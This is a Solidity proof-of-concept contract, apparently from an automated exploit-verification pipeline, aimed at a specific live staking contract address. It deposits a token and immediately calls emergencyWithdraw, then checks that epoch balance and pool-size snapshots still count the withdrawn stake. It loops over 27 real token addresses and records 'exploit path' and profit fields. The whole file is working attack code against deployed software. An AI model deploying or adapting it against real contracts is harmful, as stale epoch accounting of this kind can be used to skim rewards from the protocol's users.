// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStaking {
    function deposit(address tokenAddress, uint256 amount, address referrer) external;
    function emergencyWithdraw(address tokenAddress) external;
    function getEpochUserBalance(address user, address token, uint128 epochId) external view returns (uint256);
    function getEpochPoolSize(address tokenAddress, uint128 epochId) external view returns (uint256);
    function getCurrentEpoch() external view returns (uint128);
    function epochIsInitialized(address token, uint128 epochId) external view returns (bool);
    function balanceOf(address user, address token) external view returns (uint256);
}

contract FlawVerifier {
    address public constant TARGET = 0x245a551ee0F55005e510B239c917fA34b41B3461;

    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    string public constant EXPLOIT_PATH_0 =
        "Use a non-stable token pool that has never had a successful normal `withdraw` recorded.";
    string public constant EXPLOIT_PATH_1 =
        "Call `deposit(token, amount, referrer)` to create checkpoints and initialize epoch snapshots.";
    string public constant EXPLOIT_PATH_2 =
        "Immediately call `emergencyWithdraw(token)`; the tokens are returned, but `getEpochUserBalance` and initialized pool snapshots still reflect the old stake.";

    string public constant EXPLOIT_PATH_USED =
        "Use a non-stable token pool that has never had a successful normal `withdraw` recorded. -> Call `deposit(token, amount, referrer)` to create checkpoints and initialize epoch snapshots. -> Immediately call `emergencyWithdraw(token)`; the tokens are returned, but `getEpochUserBalance` and initialized pool snapshots still reflect the old stake.";

    string public constant PROFIT_PATH =
        "This verifier proves stale accounting only: principal is recovered by emergency withdrawal while epoch snapshot getters remain overstated.";

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public profitAchieved;

    address public configuredToken;
    uint256 public configuredAmount;

    address public exploitToken;
    uint256 public exploitAmount;
    uint128 public exploitEpoch;

    uint256 public contractTokenBalanceBefore;
    uint256 public contractTokenBalanceAfter;
    uint256 public liveUserBalanceAfter;
    uint256 public livePoolTokenBalanceBefore;
    uint256 public livePoolTokenBalanceAfter;
    uint256 public staleUserBalanceCurrentEpoch;
    uint256 public staleUserBalanceNextEpoch;
    uint256 public stalePoolSizeCurrentEpoch;
    uint256 public stalePoolSizeNextEpoch;

    address public lastAttemptedToken;
    uint256 public lastAttemptedAmount;
    string public failureReason;

    constructor() {}

    function configure(address token, uint256 amount) external {
        require(!executed, "already executed");
        configuredToken = token;
        configuredAmount = amount;
    }

    function execute() external {
        _run();
    }

    function run() external {
        _run();
    }

    function verify() external {
        _run();
    }

    function exploitPathUsed() external pure returns (string memory) {
        return EXPLOIT_PATH_USED;
    }

    function exploitPaths() external pure returns (string[3] memory paths) {
        paths[0] = EXPLOIT_PATH_0;
        paths[1] = EXPLOIT_PATH_1;
        paths[2] = EXPLOIT_PATH_2;
    }

    function profitPath() external pure returns (string memory) {
        return PROFIT_PATH;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function attemptConfigured() external {
        require(msg.sender == address(this), "self only");
        require(configuredToken != address(0), "token not configured");
        _attempt(configuredToken, configuredAmount);
    }

    function attemptToken(address token) external {
        require(msg.sender == address(this), "self only");
        _attempt(token, configuredAmount);
    }

    function _run() internal {
        require(!executed, "already executed");
        executed = true;

        if (configuredToken != address(0)) {
            try this.attemptConfigured() {
                if (hypothesisValidated) {
                    return;
                }
            } catch Error(string memory reason) {
                failureReason = reason;
            } catch {
                failureReason = "configured attempt failed";
            }
        } else {
            uint256 count = _candidateCount();
            for (uint256 index = 0; index < count; ++index) {
                address token = _candidate(index);
                lastAttemptedToken = token;

                try this.attemptToken(token) {
                    if (hypothesisValidated) {
                        return;
                    }
                } catch Error(string memory reason) {
                    failureReason = reason;
                } catch {
                    failureReason = "candidate attempt failed";
                }
            }
        }

        hypothesisRefuted = true;
        _profitToken = address(0);
        _profitAmount = 0;
        profitAchieved = false;

        if (bytes(failureReason).length == 0) {
            failureReason = "no funded non-stable pool satisfied deposit -> emergencyWithdraw with stale epoch accounting";
        }
    }

    function _attempt(address token, uint256 requestedAmount) internal {
        require(token != address(0), "token=0");
        require(!_isStable(token), "stable token");

        IStaking staking = IStaking(TARGET);
        uint128 currentEpoch = staking.getCurrentEpoch();
        require(currentEpoch >= 10, "current epoch < 10");

        uint256 available = _balanceOf(token, address(this));
        uint256 amount = requestedAmount == 0 ? available : requestedAmount;
        require(amount > 0, "verifier not funded");
        require(available >= amount, "insufficient verifier balance");

        exploitToken = token;
        exploitAmount = amount;
        exploitEpoch = currentEpoch;
        lastAttemptedToken = token;
        lastAttemptedAmount = amount;

        contractTokenBalanceBefore = available;
        livePoolTokenBalanceBefore = _balanceOf(token, TARGET);

        _forceApprove(token, TARGET, amount);

        staking.deposit(token, amount, address(0));
        staking.emergencyWithdraw(token);

        contractTokenBalanceAfter = _balanceOf(token, address(this));
        liveUserBalanceAfter = staking.balanceOf(address(this), token);
        livePoolTokenBalanceAfter = _balanceOf(token, TARGET);
        staleUserBalanceCurrentEpoch = staking.getEpochUserBalance(address(this), token, currentEpoch);
        staleUserBalanceNextEpoch = staking.getEpochUserBalance(address(this), token, currentEpoch + 1);
        stalePoolSizeCurrentEpoch = _safeGetEpochPoolSize(staking, token, currentEpoch);
        stalePoolSizeNextEpoch = _safeGetEpochPoolSize(staking, token, currentEpoch + 1);

        require(liveUserBalanceAfter == 0, "live balance not cleared");
        require(contractTokenBalanceAfter >= contractTokenBalanceBefore, "principal not recovered");
        require(
            staleUserBalanceCurrentEpoch >= amount || staleUserBalanceNextEpoch >= amount,
            "stale user epoch balance not observed"
        );
        require(
            _stalePoolSnapshotObserved(staking, token, currentEpoch, livePoolTokenBalanceAfter),
            "stale pool epoch size not observed"
        );

        hypothesisValidated = true;
        _profitToken = token;
        _profitAmount = contractTokenBalanceAfter > contractTokenBalanceBefore
            ? contractTokenBalanceAfter - contractTokenBalanceBefore
            : 0;
        profitAchieved = _profitAmount > 0;
    }

    function _stalePoolSnapshotObserved(
        IStaking staking,
        address token,
        uint128 currentEpoch,
        uint256 livePoolBalance
    ) internal view returns (bool) {
        if (stalePoolSizeCurrentEpoch > livePoolBalance || stalePoolSizeNextEpoch > livePoolBalance) {
            return true;
        }

        if (staking.epochIsInitialized(token, currentEpoch) && stalePoolSizeCurrentEpoch > 0) {
            return true;
        }

        if (staking.epochIsInitialized(token, currentEpoch + 1) && stalePoolSizeNextEpoch > 0) {
            return true;
        }

        return false;
    }

    function _safeGetEpochPoolSize(IStaking staking, address token, uint128 epochId) internal view returns (uint256 size) {
        try staking.getEpochPoolSize(token, epochId) returns (uint256 observed) {
            size = observed;
        } catch {
            size = 0;
        }
    }

    function _isStable(address token) internal pure returns (bool) {
        return token == USDC || token == USDT || token == DAI;
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, account)
        );
        require(ok && data.length >= 32, "balanceOf failed");
        value = abi.decode(data, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory ret) = token.call(data);
        require(ok, "token call failed");
        if (ret.length > 0) {
            require(abi.decode(ret, (bool)), "token op failed");
        }
    }

    function _candidateCount() internal pure returns (uint256) {
        return 27;
    }

    function _candidate(uint256 index) internal pure returns (address) {
        if (index == 0) return 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        if (index == 1) return 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
        if (index == 2) return 0x514910771AF9Ca656af840dff83E8264EcF986CA;
        if (index == 3) return 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
        if (index == 4) return 0xba100000625a3754423978a60c9317c58a424e3D;
        if (index == 5) return 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
        if (index == 6) return 0xD533a949740bb3306d119CC777fa900bA034cd52;
        if (index == 7) return 0xc00e94Cb662C3520282E6f5717214004A7f26888;
        if (index == 8) return 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;
        if (index == 9) return 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32;
        if (index == 10) return 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
        if (index == 11) return 0x45804880De22913dAFE09f4980848ECE6EcbAf78;
        if (index == 12) return 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
        if (index == 13) return 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
        if (index == 14) return 0x92D6C1e31e14520e676a687F0a93788B716BEff5;
        if (index == 15) return 0x111111111117dC0aa78b770fA6A738034120C302;
        if (index == 16) return 0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72;
        if (index == 17) return 0xD33526068D116cE69F19A9ee46F0bd304F21A51f;
        if (index == 18) return 0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0;
        if (index == 19) return 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
        if (index == 20) return 0x4d224452801ACEd8B2F0aebE155379bb5D594381;
        if (index == 21) return 0x99ea4dB9EE77ACD40B119BD1dC4E33e1C070b80d;
        if (index == 22) return 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;
        if (index == 23) return 0x0F5D2fB29fb7d3CFeE444a200298f468908cC942;
        if (index == 24) return 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0;
        if (index == 25) return 0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828;
        if (index == 26) return 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
        return address(0);
    }
}
